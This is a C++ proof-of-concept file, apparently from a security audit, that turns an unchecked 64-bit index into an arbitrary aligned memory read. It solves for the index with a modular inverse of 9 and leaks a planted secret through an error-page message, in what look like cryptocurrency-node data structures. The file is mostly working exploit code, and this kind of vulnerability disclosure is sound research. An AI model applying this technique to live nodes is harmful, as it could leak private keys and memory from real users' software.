// Finding 4 — the index is uint64_t, so byte offset = real_output * 72 (mod 2^64).
// 72 = 8*9 and 9 is odd, hence invertible mod 2^61. Therefore every 8-byte-aligned
// offset -- forwards AND backwards, via wraparound -- is reachable exactly.
// This makes the primitive an arbitrary aligned 64-bit read, not a 72-byte sampling.
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>
#include <utility>
#include <array>
#include <string>

struct ctkey { std::array<unsigned char,64> b{}; };
using output_entry = std::pair<uint64_t, ctkey>;

static std::string error_page(uint64_t a, uint64_t idx) {
    char b[160];
    snprintf(b, sizeof b, "Output with amount %lu and index %lu does not exist!", a, idx);
    return b;
}
// modular inverse of 9 mod 2^64 (Newton iteration)
static uint64_t inv9() {
    uint64_t x = 1;
    for (int i = 0; i < 6; ++i) x *= 2 - 9 * x;
    return x;
}

int main() {
    auto* victim = new unsigned char[32];
    memcpy(victim, "\xde\xad\xbe\xef\xca\xfe\xba\xbeSECRET-VIEWKEY-BYTES-HERE", 32);

    std::vector<output_entry> outputs(2);
    unsigned char* base = (unsigned char*)outputs.data();

    int64_t delta = (int64_t)(victim - base);
    printf("target delta from outputs.data() = %ld bytes (%s)\n",
           delta, delta % 8 ? "not 8-aligned" : "8-aligned");
    printf("inv(9) mod 2^64 = 0x%016lx   (check: 9*inv = %lu)\n", inv9(), 9UL * inv9());

    // offset = 72*k  =>  k = (delta/8) * inv(9)   (mod 2^64)
    uint64_t real_output = (uint64_t)(delta / 8) * inv9();
    printf("solved real_output = %lu (0x%016lx)\n", real_output, real_output);
    printf("check: real_output*72 = %ld  == delta? %s\n\n",
           (int64_t)(real_output * 72), (int64_t)(real_output * 72) == delta ? "YES" : "no");

    uint64_t leaked = outputs[real_output].first;     // OOB read at chosen offset
    printf("expected secret word = 0x%016lx\n", *(uint64_t*)victim);
    printf("leaked   value       = 0x%016lx  %s\n", leaked,
           leaked == *(uint64_t*)victim ? "<-- EXACT MATCH" : "<-- mismatch");
    printf("response body -> \"%s\"\n", error_page(0, leaked).c_str());
    delete[] victim;
    return 0;
}
